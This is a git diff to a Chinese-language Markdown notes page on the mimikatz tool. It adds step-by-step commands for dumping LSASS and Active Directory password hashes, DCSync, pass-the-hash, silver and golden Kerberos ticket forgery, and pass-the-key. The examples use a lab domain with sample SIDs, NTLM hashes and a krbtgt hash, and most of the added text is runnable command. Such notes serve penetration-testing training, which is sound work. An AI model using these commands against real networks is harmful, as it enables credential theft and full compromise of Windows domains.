@@ -1,7 +1,7 @@
 # mimikatz
 
 <p align="center">
-    <img src="../../../assets/img/logo/mimikatz.jpg" width="25%"></a>
+    <img src="../../../assets/img/logo/mimikatz.jpg" width="25%">
 </p>
 
 ---
@@ -203,9 +203,43 @@ lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
 
 ---
 
-# 哈希传递
+# NTDS.DIT
 
-**文章**
+使用 Mimikatz 提取 Active Directory hash
+```
+privilege::debug
+mimikatz lsadump::lsa /inject exit
+sekurlsa::minidump c:\temp\lsass.dmp      使用 Mimikatz 转储 LSASS 内存
+sekurlsa::logonpasswords
+```
+
+**DCSync**
+
+Mimikatz 有一个功能（dcsync），利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码哈希值。该技术消除了直接从域控制器进行认证的必要性，因为它可以从域管理员环境中属于域的任意系统执行。
+
+运行 DCSync 需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都能够运行 DCSync 来提取密码数据。请注意，只读域控制器不仅可以默认为用户提取密码数据。
+```
+privilege::debug
+lsadump::dcsync /domain:ffffffff0x.com /all /csv
+```
+
+通过使用 /user 参数指定域用户名，Mimikatz 会将该指定用户的所有帐户信息转储包括哈希值。
+```
+lsadump::dcsync /domain:ffffffff0x.com /user:krbtgt
+lsadump::dcsync /domain:ffffffff0x.com /user:test
+```
+
+可以直接在域控制器中执行 Mimikatz，通过 lsass.exe 进程 dump 密码哈希
+```
+privilege::debug
+lsadump::lsa /inject
+```
+
+---
+
+# PTH
+
+**相关文章**
 - [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
 - https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
 - [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
@@ -259,7 +293,12 @@ lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
 
 2. 通过 pth 进行远程登录(cmd)
     ```
+    mimikatz.exe privilege::debug
+    mimikatz.exe sekurlsa::logonpasswords
+
     mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域(工作组则为.) /user:目标机器的用户名 /ntlm:用户名对应的hash"
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:test.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
     ```
 
 3. 通过 pth 进行远程登录(mstsc)
@@ -269,3 +308,107 @@ lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
     ```
 
     RDP 限制管理模式是建立在 Kerberos 基础上的。看一下网络流量，可以看到 RDP 客户端代表模拟的用户请求 ticket，这没有问题，因为我们只需要通过哈希来验证 Kerberos。
+
+---
+
+# PTT
+## Silver_Tickets
+
+导出 Server Hash
+```
+mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
+```
+
+使用 mimikatz 伪造白银票据：
+```
+mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit
+```
+
+**例子:访问域控上的 cifs 服务(Windoiws 主机间的文件共享)**
+
+在域控上执行以下命令获取本地账户 NTLM Hash 和 SID
+
+```
+mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
+```
+
+![](../../../assets/img/安全/工具/mimikatz/1.png)
+
+然后将生成白银票据注入到内存中,并查看票据生成情况。查看目标的文件共享服务成功：
+```
+kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /rc4:f9ca454a3544172034a8666a79eda95e /service:cifs /user:test /ptt
+
+// 这里的 cifs 是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
+```
+
+访问测试
+
+![](../../../assets/img/安全/工具/mimikatz/2.png)
+
+---
+
+## Golden_Tickets
+
+登录域控抓取 krbtgt 的密码 Hash 和获取域 SID
+```
+mimikatz.exe log "lsadump::dcsync /domain:<域名> /user:krbtgt"
+```
+
+使用 mimikatz 伪造的黄金票据：
+```
+kerberos::golden /user:<用户名> /domain:<域名> /sid:<域SID> /krbtgt:<Hash> /ticket:test.kiribi
+```
+
+利用 mimikatz 的 kerberos::ptt 将黄金票据 test.kiribi 注入到内存中：
+```
+// 清除缓存的票据
+kerberos::purge
+
+// 注入黄金票据 test.kiribi
+kerberos::ptt test.kiribi
+
+// 列出票据
+kerberos::list
+```
+
+> 导入的票据在20分钟内有效，过期之后再次导入就行
+
+现在可以访问域控共享目录，还能在 DC 上远程执行 psexec
+
+但是需要注意的是用 psexec 远程执行命令的时候，需要不能使用 IP 访问。使用 NetBios 的服务名访问才会走 Kerberos 认证，达到伪造凭据的攻击
+
+**例子**
+
+在数据库服务器上，利用域管理员的权限获得 krbtgt 的 NTLM 哈希 和 SID
+
+使用 Mimikatz 抓取 Krbtgt 账号的密码
+```
+mimikatz.exe "lsadump::dcsync /domain:ffffffff0x.com /user:krbtgt" > log.txt
+```
+
+![](../../../assets/img/安全/工具/mimikatz/3.png)
+
+得到 krbtgt 哈希之后，使用 mimikatz 的 `kerberos::golden` 生成黄金票据 `test.kiribi`：
+```
+kerberos::golden /user:administrator /domain:FFFFFFFF0X.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /krbtgt:743093920acd8d427323c24c0e2c52c2 /ticket:test.kiribi
+```
+`/admin` 为伪造的用户名，用户名可以任意伪造 `/domain` 为目标的域名 `/sid` 为目标域名的 SID `/krbtgt` 为 krbtgt 账户密码的 NTLM Hash `/ticket` 为要伪造的黄金票据的名称
+
+注入黄金票据
+```
+kerberos::ptt test.kiribi
+```
+
+访问测试
+
+![](../../../assets/img/安全/工具/mimikatz/4.png)
+
+---
+
+# PTK
+
+```
+mimikatz "privilege::debug" "sekurlsa::ekeys"
+
+mimikatz "privilege::debug" "sekurlsa::pth /user:test /domain:test.com /aes256:c4388a1fb9bd65a88343a32c09e53ba6c1ead4de8a17a442e819e98c522fc288"
+```
